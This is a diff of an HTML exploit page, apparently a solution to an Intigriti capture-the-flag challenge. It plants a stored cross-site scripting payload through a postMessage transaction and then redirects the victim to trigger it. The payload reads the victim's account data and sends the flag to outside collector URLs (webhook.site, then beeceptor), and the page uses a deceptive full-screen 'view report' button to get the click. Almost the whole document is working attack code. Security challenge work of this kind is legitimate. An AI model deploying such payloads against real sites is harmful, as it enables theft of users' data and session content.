@@ -1,38 +1,35 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <style>
+        button { width: 100%; height: 100vh; font-size: 50px; cursor: pointer; }
+    </style>
+</head>
 <body>
+    <button id="exploit">CLICK TO VIEW REPORT</button>
     <script>
         const challengeDomain = "https://challenge-0126.intigriti.io";
-        const webhook = "https://webhook.site/f174d90f-ba4f-4ee9-b67b-bdefbadc2be4";
-        
-        // Use a more robust payload that handles potential character limits
-        // This escapes the title attribute and exfiltrates the flag
-        const xss = `"><svg onload="fetch('/api/me').then(r=>r.json()).then(d=>fetch('${webhook}?flag='+encodeURIComponent(d.flag)))">`;
+        const beeceptor = "https://kavil.free.beeceptor.com";
+        const xss = `"><svg/onload="fetch('/api/me').then(r=>r.json()).then(d=>fetch('${beeceptor}/flag?v='+btoa(d.flag)))">`;
 
-        // Create the iframe to checkout.html
-        const iframe = document.createElement('iframe');
-        // We target 1337COIN because the Admin definitely holds it
-        iframe.src = `${challengeDomain}/checkout.html?currency=1337COIN&price=1000000`;
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
-
-        iframe.onload = () => {
-            // Give the checkout page a moment to initialize its message listener
+        document.getElementById('exploit').onclick = function() {
+            // Open checkout in a new tab/window
+            const win = window.open(`${challengeDomain}/checkout.html?currency=1337COIN&price=1`);
+            
             setTimeout(() => {
-                iframe.contentWindow.postMessage({
+                win.postMessage({
                     type: 'submitTransaction',
                     transaction: {
                         toAddress: xss,
-                        currency: '1337COIN', // Target the Admin's specific currency
-                        amount: 0.00000001
+                        currency: '1337COIN',
+                        amount: 0.000001
                     }
                 }, '*');
-            }, 1000);
 
-            // Redirect to MarketWatch to trigger the stored XSS
-            setTimeout(() => {
-                window.location.href = `${challengeDomain}/marketwatch.html`;
-            }, 3000);
+                setTimeout(() => {
+                    win.location.href = `${challengeDomain}/marketwatch.html`;
+                }, 2000);
+            }, 2000);
         };
     </script>
 </body>
